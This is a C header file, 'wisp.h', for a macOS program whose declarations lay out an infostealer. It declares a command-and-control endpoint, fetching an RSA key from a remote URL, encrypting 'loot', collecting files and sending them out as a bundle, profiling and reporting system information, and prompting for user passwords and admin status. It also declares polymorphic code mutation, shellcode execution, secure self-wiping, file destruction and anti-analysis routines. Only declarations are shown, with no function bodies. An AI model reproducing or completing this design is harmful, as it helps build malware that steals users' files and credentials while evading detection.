#pragma once
/**
 * @file wisp.h
 */

#ifdef __cplusplus
extern "C" {
#endif

// ----------------------------------------
// C 
// ----------------------------------------
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

// ----------------------------------------
// System
// ----------------------------------------
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/random.h>
#include <sys/xattr.h>
#include <arpa/inet.h>
#include <libgen.h>
#include <ftw.h>
#include <grp.h>
#include <pwd.h>
#include <uuid/uuid.h>
#include <dlfcn.h>
#include <sys/sysctl.h>

// ----------------------------------------
//  Mach-O & Kernel
// ----------------------------------------
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/getsect.h>
#include <mach-o/fat.h>
#include <libkern/OSCacheControl.h>
#include <mach/mach_time.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <OpenDirectory/OpenDirectory.h>

// ----------------------------------------
// Crypto & Networking
// ----------------------------------------
#include <zlib.h>
#include <curl/curl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>

#ifdef __x86_64__
#include <immintrin.h>
#endif

// ----------------------------------------
//  Macros
// ----------------------------------------
#define KEY_SIZE        32
#define STUB_SIZE       30
#define JUNK_SIZE       16
#define BLOCK_SIZE      16
#define MAX_FILES       1024
#define PWD             256
#define PAGE_SIZE       4096

#ifdef TEST
#  define DBG(fmt, ...)    fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#else
#  define DBG(...) ((void)0)
#endif

#define ROTL32(x, n)      (((x) << (n)) | ((x) >> (32 - (n))))

#define cipher(k, iv, in, out, len)     crypt_payload(1, k, iv, in, out, len)
#define decipher(k, iv, in, out, len)   crypt_payload(0, k, iv, in, out, len)

char *decrypt_path(const uint8_t *key, const uint8_t *iv, const uint8_t *data, size_t len);

// ----------------------------------------
// Arch
// ----------------------------------------
#if defined(ARCH_X86)

typedef enum {
    OP_NONE, OP_REG, OP_MEM, OP_IMM
} op_type_t;

typedef struct {
    op_type_t type;
    uint8_t size;
    union {
        uint8_t reg;
        struct {
            uint8_t base, index, scale;
            int64_t disp;
        } mem;
        uint64_t imm;
    };
} operand_t;

typedef struct {
    uint8_t raw[15];
    uint8_t len;
    uint8_t prefixes;
    uint8_t rex;
    uint8_t opcode[4];
    uint8_t opcode_len;
    bool vex, evex;
    bool has_modrm, has_sib;
    uint8_t modrm, sib;
    uint8_t disp_size;
    int64_t disp;
    uint8_t imm_size;
    uint64_t imm;
    bool rex_w;
    bool modifies_ip;
    int64_t target;
    bool valid;
    bool privileged;
    operand_t ops[3];
} x86_inst_t;

typedef uint8_t (*memread_fn)(uintptr_t addr);
bool decode_x86(const uint8_t *code, uintptr_t ip, x86_inst_t *inst, memread_fn mem_read);

#elif defined(ARCH_ARM)

typedef enum {
    ARM_OP_NONE,
    ARM_OP_BRANCH,
    ARM_OP_BRANCH_LINK,
    ARM_OP_BRANCH_COND,
    ARM_OP_BRANCH_INDIRECT,
    ARM_OP_RET,
    ARM_OP_SVC,
    ARM_OP_SYS
} arm_op_t;

typedef struct {
    uint32_t raw;
    int64_t target;
    arm_op_t type;
    bool valid;
    bool privileged;
} arm64_inst_t;

bool decode_arm64(const uint8_t *code, arm64_inst_t *out);

#endif

// ----------------------------------------
// Structures
// ----------------------------------------
typedef struct __attribute__((packed)) {
    uint8_t  key[KEY_SIZE];
    uint8_t  iv[kCCBlockSizeAES128];
    uint64_t seed;
    uint32_t count;
    uint8_t  hash[CC_SHA256_DIGEST_LENGTH];
} enc_header_t;

typedef struct {
    uint8_t  key[KEY_SIZE];
    uint8_t  iv[12];
    uint8_t  stream[64];
    size_t   position;
    uint64_t counter;
} chacha_state_t;

typedef struct {
    char   *path;
    size_t  size;
} file_t;

typedef enum {
    WIPE_ZERO,
    WIPE_ONE,
    WIPE_RANDOM,
    WIPE_CUSTOM
} wipe_pattern_t;

typedef struct {
    int             passes;
    wipe_pattern_t *patterns;
    unsigned char   custom;
} wipe_conf_t;

typedef struct {
    char   *data;
    size_t  size;
} mem_buf_t;

typedef struct {
    uint8_t key[KEY_SIZE];
    uint8_t iv[16];
    size_t  len;
    uint8_t data[64];
} enc_vault_t;

extern file_t *files[MAX_FILES];
extern const enc_vault_t vault[];
extern const enc_vault_t paths[];
typedef int (*sysctl_fn)(int *, u_int, void *, size_t *, void *, size_t);

// ----------------------------------------
// Globals
// ----------------------------------------
extern char C2_ENDPOINT[1024];
extern char PUBKEY_URL[1024];
extern file_t *files[MAX_FILES];
extern int fileCount;
extern char tmpDirectory[256];
extern char *_strings[8];
extern struct mach_header_64 _mh_execute_header;
extern uint8_t data[sizeof(enc_header_t) + PAGE_SIZE];
extern const uint8_t dummy[];
extern const size_t len;
extern const enc_vault_t vault[];
extern const size_t vault_count;
extern const enc_vault_t paths[];
extern const size_t paths_count;

// ----------------------------------------
// Wisp
// ----------------------------------------

// Pop 
int  boot(uint8_t *section_data, size_t section_size, chacha_state_t *rng);
int  cook(uint8_t *section_data, size_t section_size, chacha_state_t *rng);
void pop_shellcode(uint8_t *code, size_t size);

// Mutation
void mutate(uint8_t *code, size_t size, chacha_state_t *rng);
void swap_instructions(uint8_t *code, size_t size, chacha_state_t *rng);
void insert_junk(uint8_t *code, size_t size, chacha_state_t *rng);
void opaque_predicate(uint8_t *buf, size_t *len, uint32_t value);

// Crypto 
void chacha20_block(const uint32_t key[8], uint32_t counter,
                    const uint32_t nonce[3], uint32_t out[16]);
uint32_t chacha20_random(chacha_state_t *rng);
void chacha20_init(chacha_state_t *rng, const uint8_t *seed, size_t len);

int trim_newlines(uint8_t *buf, size_t len);
void crypt_payload(int encrypt,
                   const uint8_t *key, const uint8_t *iv,
                   const uint8_t *in,  uint8_t *out,
                   size_t len);

unsigned char *wrap_loot(const unsigned char *plaintext,
                         size_t plaintext_len,
                         size_t *out_len,
                         RSA *rsa_pubkey);

// Tools
size_t snap_instr_len(const uint8_t *code);
bool   it_op(const uint8_t *code);
bool   it_chunk(const uint8_t *code, size_t max_len);

// Persistence, Wiping
wipe_conf_t *prep_nuker(int passes);
void         burn_config(wipe_conf_t *config);
int          self_wipe(const char *path, const wipe_conf_t *config);
int          nuke_file(const char *path, const wipe_conf_t *config);

// Networking & C2
size_t networkWriteCallback(void *contents, size_t size, size_t nmemb, void *userp);
RSA* grab_rsa(const char *url);
char* fetch_past(const char *url);
int from_past(const char *content, char *pubkey_url, char *c2_endpoint);
void overn_out(const char *server_url, const unsigned char *data, size_t size);

// Profiling & System Info
void profiler(char *buffer, size_t bufsize, size_t *offset);
void collectSystemInfo(RSA *rsaPubKey);
void mint_uuid(char *id);

int sendProfile(void);

// String 
void initialize__strings();
void cleanup__strings();

// Environment
int scan(void);
int path_exists(const char *p);
char *trim_w1(char *str);

// Id
int  find_self(char *out, uint32_t *size);
void mint_uuid(char *id);
int  autodes(void);
void k_ill(void);
__attribute__((noreturn)) void panic(void);

// Auth
char *request_input(const char *prompt_script);
void  request_a(void);
int   auth(const char *username, const char *password);
int   is_user_admin(const char *username);

// I/O 
extern void O2(void *dest, const void *src, size_t n);
extern void zer0(void *ptr, size_t n);

int  oprw(const char *path);
void clso(int fd);
int  reset(int fd);
int  wrby(int fd, unsigned char *buf, size_t len);

int copyFile(const char *src, const char *dst);
unsigned char* compressData(const unsigned char *in, size_t inLen, size_t *outLen);
int fileCollector(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf);
void sendFilesBundle(RSA *rsaPubKey);

// Misc
char *execute(const char *command);
void  free_if_not(void *ptr);
char *extract(const char *output, const char *start_marker, const char *end_marker);
void  hexdump(const uint8_t *data, size_t len, const char *label);

int   _snprintf(char *str, size_t size, const char *fmt, ...);
char *_strncpy(char *dest, const char *src, size_t n);

// Info
char *get_device_id(void);
char *get_current_user(void);
void  update(void);

// URL & HTTP
/* void build_url(char *buf);
void http_post(const char *url, const unsigned char *data, size_t size); */

#ifdef __cplusplus
}
#endif